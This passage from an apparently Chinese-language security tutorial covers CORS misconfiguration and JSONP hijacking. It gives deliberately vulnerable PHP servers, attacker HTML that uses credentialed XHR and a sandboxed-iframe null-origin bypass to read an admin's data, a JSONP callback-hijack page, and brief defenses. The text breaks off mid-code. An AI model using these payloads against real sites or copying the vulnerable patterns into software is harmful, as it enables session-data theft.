class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-string">&#x27;/&#x27;</span>,<br>                              <span class="hljs-string">&#x27;domain&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>, // 或您的域名<br>                              <span class="hljs-string">&#x27;secure&#x27;</span> =&gt; <span class="hljs-literal">true</span>,       // SameSite=None 要求同时设置 Secure 属性为 <span class="hljs-literal">true</span><br>                              <span class="hljs-string">&#x27;httponly&#x27;</span> =&gt; <span class="hljs-literal">true</span>,      // 允许JavaScript访问<br>                              <span class="hljs-string">&#x27;samesite&#x27;</span> =&gt; <span class="hljs-string">&#x27;None&#x27;</span>     // 必须为None才能跨域<br>                              ]);<br><br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>    <span class="hljs-comment">//输出信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;login sucess  &#x27;</span>;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;login fail&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;getinfo&#x27;</span>) &#123;<br>  <span class="hljs-title function_ invoke__">session_start</span>();<br>  <span class="hljs-variable">$origin</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ORIGIN&#x27;</span>];<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.<span class="hljs-variable">$origin</span>);   <span class="hljs-comment">//动态设置源</span><br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials: true&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&#x27;  origin: &#x27;</span>.<span class="hljs-variable">$origin</span>;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>  &#125;<br><br>&#125;<br><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp的html放在vps</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stealData</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">url</span> = <span class="hljs-string">&quot;http://localhost/?action=getinfo&quot;</span>;<br><br>        <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(this.readyState == <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">if</span>(this.status == <span class="hljs-number">200</span>) &#123;<br>                    <span class="hljs-title function_ invoke__">alert</span>(this.responseText);<br>                    console.<span class="hljs-title function_ invoke__">log</span>(this.responseText);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;Failed to steal data. Status: &quot;</span> + this.status);<br>                &#125;<br>            &#125;<br>        &#125;;<br><br>        xhttp.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, url, <span class="hljs-literal">true</span>);<br>        xhttp.withCredentials = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 发送凭据（cookies）</span><br>        xhttp.<span class="hljs-title function_ invoke__">send</span>();<br>    &#125;<br>    <span class="hljs-title function_ invoke__">stealData</span>();<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>先在本地登录</p><p><code>http://localhost/index.php?action=login&amp;username=admin&amp;password=password</code></p><p><img src="/mdimg/cors/1744981595829-6d8d8f9b-aa12-4ee1-91ef-1be64cc7f5c6.png"></p><p>浏览器打开另一个标签页访问vps的html，模拟点击钓鱼链接，触发<code>csrf &amp; CORS</code>，利用cookie来窃取admin的信息</p><p><img src="/mdimg/cors/1744981595745-9891b3fe-b383-4fd3-8dbb-c6da80100b82.png"></p><p>此时发生了3次请求</p><p><img src="/mdimg/cors/1744981595861-f2b02b89-a591-4849-9ad3-e3228bd8fafa.png"></p><p>查看xhr发送的请求，<code>Access-Control-Allow-Origin</code>被动态设置为vps的ip</p><p><img src="/mdimg/cors/1744981595824-08e89895-7da2-4196-a7bb-62ff0f934ec2.png"></p><h4 id="Access-Control-Allow-Origin-null"><a href="#Access-Control-Allow-Origin-null" class="headerlink" title="Access-Control-Allow-Origin: null"></a><strong>Access-Control-Allow-Origin: null</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Access-Control-Allow-Origin: <span class="hljs-literal">null</span> <span class="hljs-comment">//不管origin是什么，都是null</span><br>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>当<code>origin</code>不是<code>null</code>时，被浏览器认为是不同源</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-literal">null</span>来源通常出现在以下场景：<br>请求来自本地文件（如 file:<span class="hljs-comment">// 协议打开的 HTML 文件）。</span><br>请求是由沙盒化的iframe 或某些特殊环境（如浏览器扩展）发起的。<br>请求是通过data: URL、about:blank 或重定向生成的。<br></code></pre></td></tr></table></figure><p>沙盒化的iframe绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> src=<span class="hljs-string">&quot;data:text/html,这里写js标签&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p>测试demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$user</span> = [<br>    <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;password&#x27;</span><br>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>  &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>    <span class="hljs-variable">$origin</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ORIGIN&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin: null&#x27;</span>);   <span class="hljs-comment">//设置源为null</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials: true&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;name&#x27;</span>] &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">session_set_cookie_params</span>([<br>            <span class="hljs-string">&#x27;lifetime&#x27;</span> =&gt; <span class="hljs-number">3600</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-string">&#x27;/&#x27;</span>,<br>            <span class="hljs-string">&#x27;domain&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>, // 或您的域名<br>            <span class="hljs-string">&#x27;secure&#x27;</span> =&gt; <span class="hljs-literal">true</span>,       // 本地测试可<span class="hljs-literal">false</span>，生产环境必须<span class="hljs-literal">true</span><br>            <span class="hljs-string">&#x27;httponly&#x27;</span> =&gt; <span class="hljs-literal">true</span>,      // 允许JavaScript访问<br>            <span class="hljs-string">&#x27;samesite&#x27;</span> =&gt; <span class="hljs-string">&#x27;None&#x27;</span>     // 必须为None才能跨域<br>        ]);<br><br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-comment">//输出信息</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;login sucess  &#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;login fail&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;getinfo&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$origin</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ORIGIN&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin: null&#x27;</span>);   <span class="hljs-comment">//设置源为null</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Credentials: true&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&#x27;  origin: &#x27;</span>.<span class="hljs-variable">$origin</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>清除浏览器cookie重新登录，然后vps的html和上面的一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stealData</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">url</span> = <span class="hljs-string">&quot;http://localhost/?action=getinfo&quot;</span>;<br><br>        <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(this.readyState == <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">if</span>(this.status == <span class="hljs-number">200</span>) &#123;<br>                    <span class="hljs-title function_ invoke__">alert</span>(this.responseText);<br>                    console.<span class="hljs-title function_ invoke__">log</span>(this.responseText);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;Failed to steal data. Status: &quot;</span> + this.status);<br>                &#125;<br>            &#125;<br>        &#125;;<br><br>        xhttp.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, url, <span class="hljs-literal">true</span>);<br>        xhttp.withCredentials = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 发送凭据（cookies）</span><br>        xhttp.<span class="hljs-title function_ invoke__">send</span>();<br>    &#125;<br>    <span class="hljs-title function_ invoke__">stealData</span>();<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>登录后，新标签页访问vps的html</p><p>可以看到此时窃取失败，http状态码返回的是0，说明浏览器的CORS阻止了返回请求结果</p><p><img src="/mdimg/cors/1744981595921-4d70df44-5e64-4538-89e7-b7db94f227e1.png"></p><p>抓包发现，其实请求是正常并且有正常响应的</p><p><img src="/mdimg/cors/1744981596676-2e4fdecc-8054-426d-ab42-6aa191162003.png"></p><p>但是CORS在浏览器层面的，所以浏览器不会返回响应,查看浏览器控制台发现报错</p><p><img src="/mdimg/cors/1744981596838-439f437e-83cb-4b84-880c-dddacdfda70f.png"></p><p>发现其实直接alert也是不行的，说明浏览器是禁止所有origin不是null的xhr请求的返回，而不是单纯的改响应码</p><p><img src="/mdimg/cors/1744981596984-207598b4-6109-4c6e-a3c6-058954fffa3e.png"></p><p>修改exp的html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms allow-modals&quot;</span> src=<span class="hljs-string">&quot;data:text/html,&lt;script&gt;</span><br><span class="hljs-string">    function stealData() &#123;</span><br><span class="hljs-string">        var xhttp = new XMLHttpRequest();</span><br><span class="hljs-string">        xhttp.onreadystatechange = function() &#123;</span><br><span class="hljs-string">                    alert(this.responseText);</span><br><span class="hljs-string">                    console.log(this.responseText);</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">        xhttp.open(&#x27;GET&#x27;, &#x27;http://localhost/?action=getinfo&#x27;, true);</span><br><span class="hljs-string">        xhttp.withCredentials = true; // 发送凭据（cookies）</span><br><span class="hljs-string">        xhttp.send();</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    stealData();</span><br><span class="hljs-string">&lt;/script&gt;&quot;</span><br>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p>成功绕过</p><p><img src="/mdimg/cors/1744981596977-4812f3cd-e147-4bd2-b10e-f60b6a109248.png"></p><p>可以看到origin为null</p><p><img src="/mdimg/cors/1744981597394-b40e1f01-8ded-4f9f-a347-b732fe60c57b.png"></p><h4 id="Access-Control-Allow-Origin-1"><a href="#Access-Control-Allow-Origin-1" class="headerlink" title="**Access-Control-Allow-Origin: ***"></a>**Access-Control-Allow-Origin: ***</h4><p>下面的响应一般不存在漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">浏览器不允许这种搭配，必须设置具体的源，不然会报错<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br><br>Access-Control-Allow-Origin: *   <span class="hljs-comment">//不限制源但是，不允许携带cookie 无法获取敏感数据</span><br></code></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a><strong>防御</strong></h2><p>引起CORS漏洞的大都是因为配置错误</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">Access-Control-Allow-Origin：设置白名单，只让信任源访问<br><br>慎重设置Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>防止携带cookie可以增强安全性，非必要不使用<br><br>使用反向代理（Same-Origin 请求）：通过 Nginx/Apache 将跨域请求转为同源<br><span class="hljs-comment"># Nginx 配置示例</span><br>location /api/ &#123;<br>    proxy_pass http:<span class="hljs-comment">//backend-server/;</span><br>    proxy_set_header Host <span class="hljs-variable">$host</span>;<br>&#125;<br><br>CSRF Token：防止csrf<br></code></pre></td></tr></table></figure><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a><strong>JSONP</strong></h2><blockquote><p>JSONP (JSON with Padding) 是 JSON 的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。</p></blockquote><h2 id="如何使用JSONP"><a href="#如何使用JSONP" class="headerlink" title="如何使用JSONP"></a><strong>如何使用JSONP</strong></h2><blockquote><p>事先定义一个用于获取跨域响应数据的回调函数，并通过没有同源策略限制的script标签发起一个请求（将回调函数的名称放到这个请求的query参数里），然后服务端返回这个回调函数的执行，并将需要响应的数据放到回调函数的参数里，前端的script标签请求到这个执行的回调函数后会立马执行，于是就拿到了执行的响应数据。</p></blockquote><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a><strong>优缺点</strong></h2><p>优点</p><blockquote><p>它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制   //利用了script标签的src属性不受同源策略影响的特性。</p><p> 它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持 并且在请求完毕后可以通过调用callback的方式回传结果</p></blockquote><p>缺点</p><blockquote><p>它只支持GET请求而不支持 POST 等其它类型的 HTTP 请求 它只支持跨域 HTTP 请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript 调用的问题</p></blockquote><h2 id="jsonp的交互流程"><a href="#jsonp的交互流程" class="headerlink" title="jsonp的交互流程"></a><strong>jsonp的交互流程</strong></h2><p>服务端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/javascript&#x27;</span>);<br><br><span class="hljs-comment">// 模拟返回用户敏感数据（未验证来源）</span><br><span class="hljs-variable">$data</span> = [<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin@example.com&#x27;</span>,<br>];<br><br><span class="hljs-comment">// 直接使用用户提供的 callback 参数，存在 XSS 和数据劫持风险</span><br><span class="hljs-variable">$callback</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>] : <span class="hljs-string">&#x27;callback&#x27;</span>;<br><br><span class="hljs-comment">// 返回 JSONP 响应</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span> . <span class="hljs-string">&#x27;(&#x27;</span> . <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;);&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>客户端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;script&gt;<br>        <span class="hljs-comment">// 定义一个回调函数，窃取数据</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stealData</span>(<span class="hljs-params">data</span>) </span>&#123;<br>            <span class="hljs-title function_ invoke__">alert</span>(JSON.<span class="hljs-title function_ invoke__">stringify</span>(data));<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;!-- 利用 JSONP 漏洞加载数据 --&gt;<br>&lt;script src=<span class="hljs-string">&quot;http://localhost/jsonp.php?callback=stealData&quot;</span>&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>结果</p><p><img src="/mdimg/cors/1744981597806-bf884ca6-bf27-47f2-a214-cea9627c4804.png"></p><p>整个jsonp的交互流程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">访问客户端页面<br>-&gt; script的src对服务端发送请求(http:<span class="hljs-comment">//localhost/jsonp.php?callback=stealData) </span><br>-&gt; 服务端返回数据(<span class="hljs-title function_ invoke__">stealData</span>(&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;admin@example.com&quot;</span>&#125;);) <br>-&gt; 浏览器获取到服务端的返回数据，然后调用当前页面的stealData方法，然后alert数据<br></code></pre></td></tr></table></figure><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a><strong>漏洞</strong></h2><p>存在漏洞有几个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">服务端存在jsonp：<br>服务端是类似<span class="hljs-keyword">echo</span> <span class="hljs-variable">$callback</span> . <span class="hljs-string">&#x27;(&#x27;</span> . <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;);&#x27;</span>;这种写法的，允许别源通过jsonp跨域请求资源的<br>（在检测时可以观察是否有?callback=xxx 这种get请求，jsonp只能用get，post不用看）<br><br>服务端没有设置csrf_token或者校验Referer等防止csrf和xss的防御：<br>jsonp要构成危害就是窃取信息一般要配合csrf或者xss，当无法窃取利用cookie时，其实无法获取敏感信息，危害不大<br><br>没有对callback的参数设置黑名单/白名单：（不是必要条件）<br>其实能拿到黑名单/白名单里的值的话，构造一样方法名的方法就行了<br></code></pre></td></tr></table></figure><p>测试</p><p>部署本地</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/javascript&#x27;</span>);<br><br><span class="hljs-comment">// 模拟返回用户敏感数据（未验证来源）</span><br><span class="hljs-variable">$user</span> = [<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-string">&#x27;admin@example.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;123&#x27;</span><br>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>  &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span 